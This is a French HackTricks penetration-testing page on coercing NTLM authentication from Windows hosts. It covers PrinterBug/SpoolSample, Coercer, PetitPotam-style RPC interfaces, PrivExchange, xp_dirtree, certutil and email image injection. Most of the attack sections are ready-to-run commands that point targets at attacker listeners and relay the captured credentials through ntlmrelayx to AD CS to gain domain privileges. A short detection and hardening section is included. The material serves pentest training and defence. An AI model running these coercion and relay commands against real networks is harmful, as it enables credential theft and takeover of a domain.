# Forcer une authentification privilégiée NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d’authentification à distance** écrits en C# avec le compilateur MIDL, afin d’éviter les dépendances tierces.

## Abus du service Spooler

Si le service _**Print Spooler**_ est **activé,** vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d’impression du contrôleur de domaine une **mise à jour** sur les nouveaux travaux d’impression, puis lui demander simplement **d’envoyer la notification à un système donné**.\
Notez que lorsqu’une imprimante envoie la notification à des systèmes arbitraires, elle doit **s’authentifier auprès de** ce **système**. Un attaquant peut donc obliger le service _**Print Spooler**_ à s’authentifier auprès d’un système arbitraire, et le service **utilisera le compte de l’ordinateur** lors de cette authentification.

Sous le capot, la primitive classique **PrinterBug** exploite **`RpcRemoteFindFirstPrinterChangeNotificationEx`** via **`\\PIPE\\spoolss`**. L’attaquant ouvre d’abord un handle vers une imprimante ou un serveur, puis fournit un faux nom de client dans `pszLocalMachine`, afin que le Spooler de la cible crée un canal de notification **vers l’hôte contrôlé par l’attaquant**. C’est pourquoi il s’agit d’une **coercition d’authentification sortante** et non d’une exécution directe de code.<sup>[[2]](#references)</sup>\
Si vous recherchez une **RCE/LPE** dans le Spooler lui-même, consultez [PrintNightmare](printnightmare.md). Cette page se concentre sur la **coercition et le relay**.

### Trouver des serveurs Windows sur le domaine

Utilisez PowerShell pour lister les hôtes Windows. Les serveurs sont généralement les cibles prioritaires ; concentrez-vous donc d’abord sur eux :

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Détecter les services Spooler à l’écoute

À l’aide d’une version légèrement modifiée de [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), vérifiez si le service Spooler est à l’écoute :

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Vous pouvez également utiliser `rpcdump.py` sous Linux et rechercher le protocole **MS-RPRN** :

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Ou tester rapidement des hôtes depuis Linux avec **NetExec/CrackMapExec** :

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Si vous souhaitez **recenser les surfaces de coercition** au lieu de simplement vérifier si le point de terminaison du spooler existe, utilisez le **mode scan de Coercer** :<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

C'est utile, car voir le point de terminaison dans EPM indique uniquement que l'interface RPC d'impression est enregistrée. Cela ne garantit **pas** que toutes les méthodes de coercition soient accessibles avec vos privilèges actuels ni que l'hôte déclenche un flux d'authentification exploitable.

### Demander au service de s'authentifier auprès d'un hôte arbitraire

Vous pouvez compiler [SpoolSample depuis le dépôt d'origine](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

ou utilisez [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sous Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Avec **Coercer**, vous pouvez cibler directement les interfaces du spooler et éviter de deviner quelle méthode RPC est exposée :<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Callbacks RPC sur TCP modernes

Ne supposez pas qu’un appel réussi à `RpcRemoteFindFirstPrinterChangeNotificationEx` doit générer du trafic sur TCP/445. **Windows 11 22H2 et les versions ultérieures utilisent RPC sur TCP par défaut pour les communications d’impression** ; RPC sur named pipes est désactivé, sauf si une stratégie ou `RpcUseNamedPipeProtocol=1` le réactive. Ainsi, les listeners hérités qui n’acceptent que SMB peuvent indiquer que le déclencheur a été envoyé sans jamais recevoir le callback. Microsoft documente TCP/135 (Endpoint Mapper) ainsi que des ports RPC dynamiques pour le RPC d’impression standard, et les organisations peuvent restreindre cette plage ou définir un port RPC d’impression fixe.<sup>[[10]](#references)</sup>

La version actuelle d’**Impacket `ntlmrelayx.py`** comprend un serveur de relais RPC et un Endpoint Mapper léger, activé par défaut sur TCP/135. Cette fonctionnalité a été intégrée en juin 2025, avec une chaîne PrinterBug vers AD CS démontrée, permettant de relayer le callback RPC authentifié même si la victime ne bascule pas vers SMB/WebDAV.<sup>[[11]](#references)</sup>

La prise en charge du relais RPC/EPM est incluse dans **Impacket 0.13.0 et les versions ultérieures**. Avant de chercher pourquoi aucun listener TCP/135 n’est disponible, vérifiez qu’une ancienne version empaquetée de `ntlmrelayx.py` n’est pas exécutée ; l’aide doit afficher les deux options du serveur RPC.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Recherchez `Setting up RPC Server on port 135` et `RPCD: Received connection` dans la sortie du relais. Si l’appel RPC renvoie une erreur attendue, mais que rien n’atteint le listener, vérifiez la stratégie de transport RPC d’impression de la victime, le filtrage sortant, la résolution DNS et si un autre processus utilise déjà TCP/135. Vérifiez également que `ntlmrelayx` n’a pas été lancé avec `--no-rpc-server`.

### Forcer HTTP au lieu de SMB avec WebClient

Sur les systèmes qui utilisent encore **RPC over named pipes** (versions anciennes ou comportement rétabli par la stratégie), le PrinterBug classique provoque généralement une authentification **SMB** vers `\\attacker\share`, ce qui reste utile pour la **capture**, le **relais vers des cibles HTTP** ou le **relais lorsque la signature SMB est absente**.\
Cependant, le relais de **SMB vers SMB** est souvent bloqué par la **signature SMB** ; les opérateurs peuvent donc préférer forcer une authentification **HTTP/WebDAV**. Il ne s’agit pas d’une solution de repli pour le comportement RPC-over-TCP décrit ci-dessus.

Si le service **WebClient** est en cours d’exécution sur la cible, le listener peut être spécifié sous une forme qui fait utiliser à Windows **WebDAV over HTTP** :

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

C'est particulièrement utile lorsqu'on combine cette technique avec **`ntlmrelayx --adcs`** ou d'autres cibles de relais HTTP, car cela évite de dépendre de la possibilité de relayer SMB sur la connexion forcée. Le point important à noter est que **WebClient doit être en cours d'exécution** sur la victime pour que la variante HTTP/WebDAV fonctionne.

### Combinaison avec la délégation sans contrainte

Si un attaquant a compromis un ordinateur configuré pour la [délégation sans contrainte](unconstrained-delegation.md), il peut **forcer l'imprimante à s'authentifier auprès de cet ordinateur**. Le **TGT** du compte ordinateur de l'imprimante est alors mis en cache en mémoire sur l'hôte à délégation sans contrainte, où l'attaquant peut le récupérer et le réutiliser avec [Pass the Ticket](pass-the-ticket.md).

### Notes sur la détection et le renforcement de la sécurité

La méthode la plus fiable pour supprimer PrinterBug d'un DC, d'un PAW ou d'un serveur qui n'imprime pas consiste à arrêter et désactiver le Spooler. Lorsque l'impression est nécessaire, renforcez la sécurité de toutes les destinations de relais possibles (signature SMB côté serveur, signature LDAP/liaison de canal et EPA sur les services HTTP tels que AD CS) plutôt que de supposer que bloquer TCP/445 sur le chemin de rappel suffit.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Si l’hôte a toujours besoin de **l’impression locale**, un contrôle plus ciblé consiste à définir la GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Cela empêche le spouleur d’accepter les connexions de clients distants (et le partage d’imprimantes), tout en laissant le service disponible localement ; redémarrez le spouleur après l’application du paramètre, puis répétez les vérifications d’accessibilité MS-RPRN ci-dessus.<sup>[[13]](#references)</sup>

La détection doit corréler un appel authentifié à l’UUID MS-RPRN `12345678-1234-abcd-ef00-0123456789ab`, en particulier les opnums 62/65 avec une valeur de callback non locale, et une connexion SMB, HTTP ou RPC sortante immédiate depuis l’hôte du spouleur. Établissez une base de référence des **UUID d’interface/opnums et des paires source/destination**, et ne surveillez pas uniquement l’accès à `\PIPE\spoolss`, car les piles d’impression actuelles peuvent utiliser RPC-over-TCP pour le callback.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## Authentification forcée RPC

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matrice de coercition de chemin UNC RPC (interfaces/opnums qui déclenchent une authentification sortante)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Outils: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Remarques: interface d’impression asynchrone sur le même pipe du spouleur ; utilisez Coercer pour énumérer les méthodes accessibles sur un hôte donné<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (également via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnums couramment exploités: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Outil: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Outil: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Outil: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Outil: CheeseOunce<sup>[[1]](#references)</sup>

Remarque : ces méthodes acceptent des paramètres pouvant contenir un chemin UNC (par exemple, `\\attacker\share`). Lorsqu’il est traité, Windows s’authentifie auprès de cet UNC avec le contexte de la machine ou de l’utilisateur, ce qui permet de capturer ou de relayer du NetNTLM.\
Pour l’abus du spouleur, **MS-RPRN opnum 65** reste la primitive la plus courante et la mieux documentée, car la spécification du protocole indique explicitement que le serveur crée un canal de notification vers le client spécifié par `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: coercition de ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN sur \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Signature de l’appel: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effet: la cible tente d’ouvrir le chemin du journal de sauvegarde fourni et s’authentifie auprès de l’UNC contrôlé par l’attaquant.<sup>[[1]](#references)</sup>
- Utilisation pratique: contraindre des actifs de niveau 0 (DC/RODC/Citrix/etc.) à émettre du NetNTLM, puis le relayer vers des endpoints AD CS (scénarios ESC8/ESC11) ou d’autres services privilégiés.<sup>[[1]](#references)</sup>

## PrivExchange

L’attaque `PrivExchange` résulte d’une faille dans la **fonctionnalité `PushSubscription` d’Exchange Server**. Cette fonctionnalité permet à tout utilisateur du domaine disposant d’une boîte aux lettres de contraindre le serveur Exchange à s’authentifier auprès de n’importe quel hôte fourni par le client via HTTP.

Par défaut, le **service Exchange s’exécute en tant que SYSTEM** et dispose de privilèges excessifs (notamment des **privilèges WriteDacl sur le domaine avant la mise à jour cumulative 2019**). Cette faille peut être exploitée pour permettre le **relais d’informations vers LDAP, puis l’extraction de la base de données NTDS du domaine**. Lorsqu’un relais vers LDAP est impossible, cette faille peut tout de même servir à relayer l’authentification vers d’autres hôtes du domaine. L’exploitation réussie de cette attaque donne immédiatement accès au compte Domain Admin avec n’importe quel compte utilisateur authentifié du domaine.

## Depuis Windows

Si vous êtes déjà dans la machine Windows, vous pouvez contraindre Windows à se connecter à un serveur avec des comptes privilégiés à l’aide de :

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d’utiliser le lolbin certutil.exe (binaire signé par Microsoft) pour forcer l’authentification NTLM :

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Via email

Si vous connaissez l’**adresse e-mail** de l’utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pouvez simplement lui envoyer un **e-mail contenant une image de 1 × 1 pixel**, par exemple :

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Lorsque la victime l’ouvre, Windows tente de s’authentifier.

### MitM

Si vous pouvez réaliser une attaque MitM et injecter du HTML dans une page consultée par la victime, essayez d’y injecter une image telle que :

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Autres méthodes pour forcer et hameçonner l’authentification NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Si vous pouvez capturer des défis [NTLMv1, découvrez ici comment les craquer](../ntlm/index.html#ntlmv1-attack).\
_N’oubliez pas que pour craquer NTLMv1, vous devez définir le défi de Responder sur « 1122334455667788 »_



## References

- [1] [Unit 42 – La coercition d’authentification continue d’évoluer](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN : RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN : protocole de communication à distance EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN : ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – méthodes d’authentification forcée de Windows](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Mises à jour des connexions RPC pour l’impression dans Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – serveur de relais RPC et Endpoint Mapper pour ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket – version 0.13.0](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP : autoriser le service Print Spooler à accepter les connexions clientes](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
